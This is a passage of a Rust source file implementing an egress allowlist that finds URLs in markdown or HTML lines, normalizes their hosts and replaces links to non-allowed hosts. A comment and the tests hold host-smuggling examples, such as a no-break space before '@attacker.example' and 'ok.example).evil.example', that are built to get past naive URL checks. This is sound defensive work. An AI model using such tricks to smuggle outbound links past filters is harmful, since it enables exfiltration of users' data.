            }
        };
        i += len;
        if matches!(c, '\t' | '\n' | '\r') || (url.is_empty() && c <= ' ') {
            continue;
        }
        url.push(c);
    }
    true
}

/// Judges a preprocessed URL string (see [`push_url_text`]; trailing C0
/// controls and spaces already stripped). `last`: the string ends here;
/// otherwise more may follow, and a host that is not allowed so far is
/// already blocked (the part on this line is all that can still be
/// replaced).
fn judge_url(allow: &EgressAllowlist, url: &str, last: bool) -> UrlJudgement {
    use UrlJudgement::{Blocked, Safe, Undecided};
    // what "no host yet" means: wait, or done
    let open = if last { Safe } else { Undecided };
    let b = url.as_bytes();
    let Some(&first) = b.first() else {
        return open;
    };
    let (auth, special, slashless) = if first.is_ascii_alphabetic() {
        let colon = match b.iter().position(|&c| !is_scheme_byte(c)) {
            None => return open, // still reading the scheme
            Some(i) if b[i] == b':' => i,
            Some(_) => return Safe, // a relative reference
        };
        let rest = colon + 1;
        let run = b[rest..].iter().take_while(|&&c| is_slash(c)).count();
        let special = SPECIAL_SCHEMES
            .iter()
            .find(|s| s.as_bytes().eq_ignore_ascii_case(&b[..colon]));
        match special {
            // `file:` has a host only right after two slashes
            Some(&"file") if run < 2 => return if rest + run == b.len() { open } else { Safe },
            Some(&"file") => (rest + 2, true, false),
            Some(_) if rest + run == b.len() => return open,
            Some(_) => (rest + run, true, run == 0),
            // a non-special scheme has an authority only after `//`
            None => match b.get(rest..rest + 2) {
                Some(b"//") => (rest + 2, false, false),
                Some(_) => return Safe,
                None if b[rest..].iter().all(|&c| c == b'/') => return open,
                None => return Safe,
            },
        }
    } else if is_slash(first) {
        let run = b.iter().take_while(|&&c| is_slash(c)).count();
        if run == b.len() {
            return open; // `/` may still become `//`
        }
        if run < 2 {
            return Safe; // a path
        }
        (run, true, false)
    } else {
        return Safe;
    };
    let a = &url[auth..];
    let plain_end = a.find(['/', '?', '#']);
    let whatwg_end = if special {
        a.find(['/', '?', '#', '\\'])
    } else {
        plain_end
    };
    let w = &a[..whatwg_end.unwrap_or(a.len())];
    let p = &a[..plain_end.unwrap_or(a.len())];
    if w.len() > MAX_AUTHORITY || p.len() > MAX_AUTHORITY {
        return Blocked;
    }
    if slashless && is_port_shaped(w) {
        return Safe;
    }
    let allowed =
        (!special || allow.authority_allowed(w, special)) && allow.authority_allowed(p, special);
    if !allowed {
        Blocked
    } else if plain_end.is_some() || last {
        Safe
    } else {
        Undecided
    }
}

/// One URL start found by the scanner.
#[derive(Debug, Clone, Copy)]
struct Hit {
    /// Where the replacement starts (the scheme, the `//` or the `www.`).
    start: usize,
    /// Where the authority starts.
    auth: usize,
    /// A special scheme, `//` or `www.`: the authority is also read as
    /// ending at `\` (WHATWG reading).
    special: bool,
    /// `http:` / `https:` with no slash: a port-shaped authority is not a
    /// host.
    slashless: bool,
}

/// The special schemes of the WHATWG URL Standard (section 4.2).
const SPECIAL_SCHEMES: &[&str] = &["http", "https", "ws", "wss", "ftp", "file"];

fn is_scheme_byte(b: u8) -> bool {
    b.is_ascii_alphanumeric() || matches!(b, b'+' | b'-' | b'.')
}

fn is_slash(b: u8) -> bool {
    b == b'/' || b == b'\\'
}

/// The next URL start at or after `from` (`at_link`: the view starts in a
/// link position carried from the previous line).
fn next_hit(view: &str, from: usize, at_link: bool) -> Option<Hit> {
    let b = view.as_bytes();
    let mut i = from;
    while i < b.len() {
        let hit = match b[i] {
            b':' => scheme_hit(b, from, i),
            b'/' | b'\\' => protocol_relative_hit(b, i, at_link),
            b'w' | b'W' => www_hit(b, i),
            _ => None,
        };
        if let Some(hit) = hit {
            return Some(hit);
        }
        i += 1;
    }
    None
}

/// A `scheme:` whose colon is at `colon` (the scheme never starts before
/// `floor`). Tabs and carriage returns in the slash run and before the
/// authority are skipped (the URL parser deletes them); inside the scheme
/// a tab separates words in prose, so it is a URL only in a quoted
/// attribute value or a tool argument, which are judged whole.
fn scheme_hit(b: &[u8], floor: usize, colon: usize) -> Option<Hit> {
    let mut start = colon;
    while start > floor && is_scheme_byte(b[start - 1]) {
        start -= 1;
    }
    while start < colon && !b[start].is_ascii_alphabetic() {
        start += 1;
    }
    if start == colon {
        return None;
    }
    let scheme = || b[start..colon].iter().filter(|&&c| !is_tab_cr(c));
    let special = SPECIAL_SCHEMES.iter().find(|s| {
        s.len() == scheme().count()
            && s.bytes()
                .zip(scheme())
                .all(|(x, &y)| x.eq_ignore_ascii_case(&y))
    });
    // the run of slashes (and deleted tabs) after the colon; `second` is
    // the position after its second slash
    let mut auth = colon + 1;
    let mut slashes = 0;
    let mut second = None;
    let mut backslash_in_two = false;
    while auth < b.len() && (is_slash(b[auth]) || is_tab_cr(b[auth])) {
        if is_slash(b[auth]) {
            slashes += 1;
            if slashes <= 2 && b[auth] == b'\\' {
                backslash_in_two = true;
            }
            if slashes == 2 {
                second = Some(auth + 1);
            }
        }
        auth += 1;
    }
    let ok = match special {
        // `file:` has a host only right after two slashes (`file:///` is
        // the empty host)
        Some(&"file") => match second {
            Some(s) => {
                auth = s;
                true
            }
            None => false,
        },
        Some(&"http" | &"https") => true,
        Some(_) => slashes >= 1,
        // a non-special scheme has an authority only after exactly `//`
        None => match second {
            Some(s) if !backslash_in_two => {
                auth = s;
                true
            }
            _ => false,
        },
    };
    while auth < b.len() && is_tab_cr(b[auth]) {
        auth += 1;
    }
    (ok && auth < b.len() && !is_authority_end(b, auth, special.is_some())).then_some(Hit {
        start,
        auth,
        special: special.is_some(),
        slashless: slashes == 0,
    })
}

/// A `//` (any mix of `/` and `\`, two or more, tabs and carriage returns
/// between them skipped) in a link position: after `(`, `=`, a quote,
/// `<`, `]:`, or at the start of a line that continues a link position
/// (`at_link`); spaces, tabs and form feeds may come between.
fn protocol_relative_hit(b: &[u8], i: usize, at_link: bool) -> Option<Hit> {
    // not the start of the run: a slash before it (tabs between)
    let mut s = i;
    while s > 0 && is_tab_cr(b[s - 1]) {
        s -= 1;
    }
    if s > 0 && is_slash(b[s - 1]) {
        return None;
    }
    let mut auth = i;
    let mut slashes = 0;
    while auth < b.len() && (is_slash(b[auth]) || is_tab_cr(b[auth])) {
        slashes += usize::from(is_slash(b[auth]));
        auth += 1;
    }
    if slashes < 2 || auth >= b.len() || is_authority_end(b, auth, true) {
        return None;
    }
    let mut p = i;
    while p > 0 && matches!(b[p - 1], b' ' | b'\t' | b'\x0c' | b'\r') {
        p -= 1;
    }
    let link_position = if p == 0 {
        at_link
    } else {
        matches!(b[p - 1], b'(' | b'=' | b'"' | b'\'' | b'<')
            || (b[p - 1] == b':' && p >= 2 && b[p - 2] == b']')
    };
    link_position.then_some(Hit {
        start: i,
        auth,
        special: true,
        slashless: false,
    })
}

/// A GFM `www.` autolink.
fn www_hit(b: &[u8], i: usize) -> Option<Hit> {
    if !b.get(i..i + 4)?.eq_ignore_ascii_case(b"www.") {
        return None;
    }
    let next = *b.get(i + 4)?;
    if !(next.is_ascii_alphanumeric() || next >= 0x80) {
        return None;
    }
    if i > 0 {
        let prev = b[i - 1];
        if prev.is_ascii_alphanumeric()
            || matches!(prev, b'.' | b'-' | b'_' | b'/' | b'\\' | b'@' | b':' | b'%')
        {
            return None;
        }
    }
    Some(Hit {
        start: i,
        auth: i,
        special: true,
        slashless: false,
    })
}

/// Whether the authority ends at byte `i`: `/ ? #`, `<`, `>`, ASCII
/// controls and whitespace, and `\` in the WHATWG reading. Non-ASCII
/// whitespace (U+00A0, U+2003, U+3000, ...) does NOT end it: a markdown
/// destination and a URL parser keep it, so in
/// `https://allowed.example<U+00A0>@attacker.example` everything before
/// the `@` is userinfo and the host is `attacker.example`.
fn is_authority_end(b: &[u8], i: usize, whatwg: bool) -> bool {
    match b[i] {
        b'/' | b'?' | b'#' | b'<' | b'>' => true,
        b'\\' => whatwg,
        c => c <= b' ' || c == 0x7f,
    }
}

/// The end of the authority starting at `auth`, or `None` when it is
/// longer than [`MAX_AUTHORITY`] (judged as blocked).
fn authority_end(view: &str, auth: usize, whatwg: bool) -> Option<usize> {
    let b = view.as_bytes();
    let limit = (auth + MAX_AUTHORITY + 1).min(b.len());
    let mut i = auth;
    while i < limit {
        if is_authority_end(b, i, whatwg) {
            return Some(i);
        }
        i += 1;
        while i < limit && !view.is_char_boundary(i) {
            i += 1;
        }
    }
    (b.len() - auth <= MAX_AUTHORITY).then_some(b.len())
}

/// Whether a slashless authority is a bare port number (`http:80`).
fn is_port_shaped(authority: &str) -> bool {
    !authority.is_empty() && authority.len() <= 5 && authority.bytes().all(|b| b.is_ascii_digit())
}

/// The end of the replacement for a blocked URL that starts at `start`
/// with its authority at `auth`: the URL runs to whitespace, `<` or `>`,
/// and to the quote it is enclosed in (`"https://..."`, an attribute value
/// or a JSON string: a quote that did not open the URL may sit inside its
/// host, `[x](https://a.example"b.example)`); trailing punctuation and
/// quotes, a trailing character reference and unbalanced closing
/// parentheses are left out (GFM autolink trimming), but the replacement
/// always covers the scheme and the authority start.
fn token_end(view: &str, start: usize, auth: usize) -> usize {
    let b = view.as_bytes();
    let enclosing = start
        .checked_sub(1)
        .map(|p| b[p])
        .filter(|q| matches!(q, b'"' | b'\'' | b'`'));
    let mut end = auth;
    while end < b.len() {
        let c = b[end];
        if c <= b' ' || c == 0x7f || matches!(c, b'<' | b'>') || Some(c) == enclosing {
            break;
        }
        end += 1;
    }
    while end < b.len() && !view.is_char_boundary(end) {
        end += 1;
    }
    let token = &view[auth..end];
    // parenthesis balance of the whole token, updated as characters are
    // trimmed (one count, so trimming stays linear)
    let mut open = token.bytes().filter(|&c| c == b'(').count();
    let mut close = token.bytes().filter(|&c| c == b')').count();
    let mut keep = token.len();
    loop {
        let t = &token[..keep];
        if let Some(amp) = trailing_char_ref(t) {
            open -= t[amp..].matches('(').count();
            close -= t[amp..].matches(')').count();
            keep = amp;
            continue;
        }
        let trimmed =
            t.trim_end_matches(['?', '!', '.', ',', ':', '*', '_', '~', ';', '"', '\'', '`']);
        if trimmed.len() != keep {
            keep = trimmed.len();
            continue;
        }
        if t.ends_with(')') && close > open {
            close -= 1;
            keep -= 1;
            continue;
        }
        break;
    }
    auth + keep.max(1).min(token.len())
}

/// The start of a character reference (`&name;`, `&#38;`) that ends `text`,
/// if any. Reference names are short: only the last 33 bytes are searched.
fn trailing_char_ref(text: &str) -> Option<usize> {
    let body = text.strip_suffix(';')?;
    let window = body.len().saturating_sub(32);
    let amp = window + body.as_bytes()[window..].iter().rposition(|&c| c == b'&')?;
    let name = &body.as_bytes()[amp + 1..];
    (!name.is_empty() && name.iter().all(|c| c.is_ascii_alphanumeric() || *c == b'#'))
        .then_some(amp)
}

/// The raw range `start..end` of a URL found in the decoded view, cut at
/// the ASCII whitespace or control bytes nearest to `auth` (the raw
/// offset of its authority start) on either side.
fn clamp_to_raw_token(raw: &str, start: usize, auth: usize, end: usize) -> Range<usize> {
    let b = raw.as_bytes();
    let is_space = |c: u8| c <= b' ' || c == 0x7f;
    let start = b[start..auth]
        .iter()
        .rposition(|&c| is_space(c))
        .map_or(start, |p| start + p + 1);
    let end = b[auth..end]
        .iter()
        .position(|&c| is_space(c))
        .map_or(end, |p| (auth + p).max(auth + 1));
    start..end.min(b.len())
}

/// A URL host as the URL parser reads it before the IDNA step:
/// percent-decoded, NFKC-normalized (fullwidth and compatibility forms fold
/// to ASCII), the ideographic full stops as `.`, ASCII lowercase. `None`
/// when the decoded bytes are not UTF-8 (the parser refuses such a host).
fn normalize_host(raw: &str) -> Option<String> {
    let decoded = percent_decode(raw)?;
    let mut host: String = if decoded.is_ascii() {
        decoded
    } else {
        decoded
            .nfkc()
            .map(|c| match c {
                // IDNA label separators that NFKC keeps
                '\u{3002}' | '\u{FF61}' => '.',
                c => c,
            })
            .collect()
    };
    host.make_ascii_lowercase();
    Some(host)
}

/// A character that can belong to a DNS label of a resolvable name: ASCII
/// letters, digits and `-`, and non-ASCII letters and digits (an
/// internationalized label, top-level domains included).
fn is_label_char(c: char) -> bool {
    c.is_ascii_alphanumeric() || c == '-' || (!c.is_ascii() && c.is_alphanumeric())
}

/// Most resolvable cut candidates judged in one host before it is blocked
/// unjudged (a real host has one or two: `host"` in an HTML attribute,
/// `host","` in JSON).
const MAX_HOST_CANDIDATES: usize = 8;

/// Longest DNS name (RFC 1035 section 2.3.4): a longer candidate cannot be
/// looked up.
const MAX_DNS_NAME: usize = 253;

/// Percent-decodes a host (`%2e` -> `.`); an invalid escape stays literal
/// (the URL parser then refuses the host, and so does the comparison).
/// `None` when the decoded bytes are not UTF-8.
fn percent_decode(raw: &str) -> Option<String> {
    if !raw.contains('%') {
        return Some(raw.to_owned());
    }
    let b = raw.as_bytes();
    let mut out = Vec::with_capacity(b.len());
    let mut i = 0;
    while i < b.len() {
        if b[i] == b'%' && i + 2 < b.len() {
            let hex = |c: u8| (c as char).to_digit(16);
            if let (Some(h), Some(l)) = (hex(b[i + 1]), hex(b[i + 2])) {
                out.push((h * 16 + l) as u8);
                i += 3;
                continue;
            }
        }
        out.push(b[i]);
        i += 1;
    }
    String::from_utf8(out).ok()
}

fn dotted(ip: u32) -> String {
    let o = ip.to_be_bytes();
    format!("{}.{}.{}.{}", o[0], o[1], o[2], o[3])
}

/// Validates and canonicalizes one allowlist entry: `(wildcard, host)`.
fn parse_entry(raw: &str) -> Result<(bool, String), &'static str> {
    if raw.len() > MAX_ENTRY_LEN {
        return Err("longer than a host name can be");
    }
    let (wild, host) = match raw.strip_prefix("*.") {
        Some(base) => (true, base),
        None => (false, raw),
    };
    if !host.is_ascii() {
        return Err("non-ASCII host: give the A-label (punycode) form");
    }
    let mut host = host.to_ascii_lowercase();
    if host.ends_with('.') {
        host.pop();
    }
    if host.is_empty() {
        return Err("empty host");
    }
    if host.starts_with('[') {
        let inner = host
            .strip_prefix('[')
            .and_then(|h| h.strip_suffix(']'))
            .ok_or("an IPv6 address must be bracketed")?;
        if wild
            || inner.is_empty()
            || !inner
                .bytes()
                .all(|c| c.is_ascii_hexdigit() || c == b':' || c == b'.')
        {
            return Err("not an IPv6 address");
        }
        return Ok((false, host));
    }
    if !wild {
        if let Some(ip) = crate::guard::rules::parse_ipv4_lenient(&host) {
            return Ok((false, dotted(ip)));
        }
    }
    let labels_ok = host.split('.').all(|label| {
        !label.is_empty()
            && label.len() <= 63
            && label
                .bytes()
                .all(|c| c.is_ascii_alphanumeric() || c == b'-' || c == b'_')
    });
    if labels_ok {
        Ok((wild, host))
    } else {
        Err("not a host name (letters, digits, `-` and `_` labels separated by `.`)")
    }
}

/// A line decoded the way a renderer reads it, with each decoded byte's
/// raw offset.
struct View {
    text: String,
    /// `map[i]` = raw offset of the character that produced decoded byte
    /// `i`; `map[text.len()]` = the raw line length.
    map: Vec<usize>,
}

/// Character references whose decoded character can matter for URL
/// syntax (HTML named references; the four legacy names also decode
/// without the `;`).
const NAMED_REFS: &[(&str, char)] = &[
    ("amp", '&'),
    ("lt", '<'),
    ("gt", '>'),
    ("quot", '"'),
    ("apos", '\''),
    ("sol", '/'),
    ("bsol", '\\'),
    ("colon", ':'),
    ("period", '.'),
    ("comma", ','),
    ("commat", '@'),
    ("lpar", '('),
    ("rpar", ')'),
    ("lsqb", '['),
    ("rsqb", ']'),
    ("lbrack", '['),
    ("rbrack", ']'),
    ("equals", '='),
    ("num", '#'),
    ("quest", '?'),
    ("percnt", '%'),
    ("excl", '!'),
    ("semi", ';'),
    ("plus", '+'),
    ("lowbar", '_'),
    ("ast", '*'),
    ("grave", '`'),
    ("Tab", '\t'),
    ("NewLine", '\n'),
    ("nbsp", '\u{A0}'),
];

/// The decoded view of `line`: character references decoded (an encoded
/// tab, line feed or carriage return deleted, as the URL parser deletes
/// them) and, in the `markdown` reading, backslash escapes of ASCII
/// punctuation removed (in the HTML reading a backslash is literal).
fn decoded_view(line: &str, markdown: bool) -> View {
    let b = line.as_bytes();
    let mut text = String::with_capacity(line.len());
    let mut map = Vec::with_capacity(line.len() + 1);
    let mut push = |c: char, raw: usize, text: &mut String| {
        text.push(c);
        map.resize(text.len(), raw);
    };
    let mut i = 0;
    while i < b.len() {
        match b[i] {
            b'\\' if markdown && b.get(i + 1).is_some_and(u8::is_ascii_punctuation) => {
                push(b[i + 1] as char, i, &mut text);
                i += 2;
            }
            b'&' => match char_ref(line, i) {
                Some((c, len)) => {
                    // an encoded tab, line feed or carriage return is
                    // deleted by the URL parser
                    if !matches!(c, '\t' | '\n' | '\r') {
                        push(c, i, &mut text);
                    }
                    i += len;
                }
                None => {
                    push('&', i, &mut text);
                    i += 1;
                }
            },
            _ => {
                let c = line[i..].chars().next().unwrap_or('\u{FFFD}');
                push(c, i, &mut text);
                i += c.len_utf8();
            }
        }
    }
    map.push(line.len());
    View { text, map }
}

/// The character reference at byte `i` (an `&`): the decoded character
/// and the reference's length in bytes.
fn char_ref(line: &str, i: usize) -> Option<(char, usize)> {
    let rest = &line.as_bytes()[i + 1..];
    if rest.first() == Some(&b'#') {
        let (hex, digits_at) = match rest.get(1) {
            Some(b'x' | b'X') => (true, 2),
            _ => (false, 1),
        };
        let digits = rest[digits_at..]
            .iter()
            .take_while(|c| {
                if hex {
                    c.is_ascii_hexdigit()
                } else {
                    c.is_ascii_digit()
                }
            })
            .count();
        if digits == 0 {
            return None;
        }
        let text = std::str::from_utf8(&rest[digits_at..digits_at + digits]).ok()?;
        let value = u32::from_str_radix(text, if hex { 16 } else { 10 }).unwrap_or(u32::MAX);
        let c = char::from_u32(value)
            .filter(|&c| c != '\0')
            .unwrap_or('\u{FFFD}');
        let semi = usize::from(rest.get(digits_at + digits) == Some(&b';'));
        return Some((c, 1 + digits_at + digits + semi));
    }
    let name_len = rest
        .iter()
        .take_while(|c| c.is_ascii_alphanumeric())
        .count();
    let name = std::str::from_utf8(&rest[..name_len]).ok()?;
    let &(_, c) = NAMED_REFS.iter().find(|(n, _)| *n == name)?;
    if rest.get(name_len) == Some(&b';') {
        return Some((c, 1 + name_len + 1));
    }
    // legacy names decode without `;` unless an alphanumeric or `=` follows
    // (the attribute rule; the name run already ends at a non-alphanumeric)
    let legacy = matches!(name, "amp" | "lt" | "gt" | "quot");
    (legacy && rest.get(name_len) != Some(&b'=')).then_some((c, 1 + name_len))
}

/// Sorts and merges overlapping or touching ranges.
fn merge_spans(spans: &mut Vec<Range<usize>>) {
    spans.sort_unstable_by_key(|r| (r.start, r.end));
    let mut merged: Vec<Range<usize>> = Vec::with_capacity(spans.len());
    for r in spans.drain(..) {
        match merged.last_mut() {
            Some(last) if r.start <= last.end => last.end = last.end.max(r.end),
            _ => merged.push(r),
        }
    }
    *spans = merged;
}

/// `line` with each (sorted, disjoint) span replaced by [`BLOCKED_URL`].
fn replace_spans(line: &str, spans: &[Range<usize>]) -> String {
    let mut out = String::with_capacity(line.len());
    let mut at = 0;
    for r in spans {
        out.push_str(&line[at..r.start]);
        out.push_str(BLOCKED_URL);
        at = r.end;
    }
    out.push_str(&line[at..]);
    out
}

#[cfg(test)]
mod tests {
    use super::{decoded_view, EgressAllowlist, BLOCKED_URL};

    fn allow() -> EgressAllowlist {
        EgressAllowlist::new(["ok.example", "*.cdn.example", "203.0.113.7"]).unwrap()
    }

    #[test]
    fn host_judgement() {
        let a =
            EgressAllowlist::new(["ok.example", "*.cdn.example", "203.0.113.7", "[::1]"]).unwrap();
        let allowed = [
            "OK.Example.",
            "ok%2Eexample",
            "\u{FF4F}\u{FF4B}.example",
            "ok\u{3002}example",
            "ok.example)",
            "ok.example&gt;",
            "ok.example\",\"v",
            "x.cdn.example",
            "a.b.cdn.example",
            "3405803783",
            "0xcb.0.0x71.07",
            "203.0.113.7)",
            "[::1]",
        ];
        for host in allowed {
            assert!(a.allows_host(host), "{host}");
        }
        let blocked = [
            "cdn.example",
            "evil.example",
            "evil.example)",
            "ok.example).evil.example",
            "ok.example\"x.evil.example",
            "ok.example;x.evil.example",
            "ok.example\u{3002}evil.example",
            "ok.example\u{FF0E}evil.example",
            "b\u{fc}cher.example",
            "evil.\u{440}\u{444}",
            "[::1]x",
            "[::2]",
            "%ff",
            "",
            "203.0.113.8",
        ];
        for host in blocked {
            assert!(!a.allows_host(host), "{host}");
        }
    }

    #[test]
    fn decoded_view_maps_back_to_raw_offsets() {
        let v = decoded_view("a&#104;\tb\\:&colon;&#9;", true);
        assert_eq!(v.text, "ah\tb::");
        assert_eq!(v.map, vec![0, 1, 7, 8, 9, 11, 22]);
    }

    #[test]
    fn replacement_never_forms_a_url() {
        let a = allow();
        for t in [BLOCKED_URL, "https:[BLOCKED_URL]", "([BLOCKED_URL])"] {
            assert!(a.is_clean(t), "{t}");
        }
    }
}
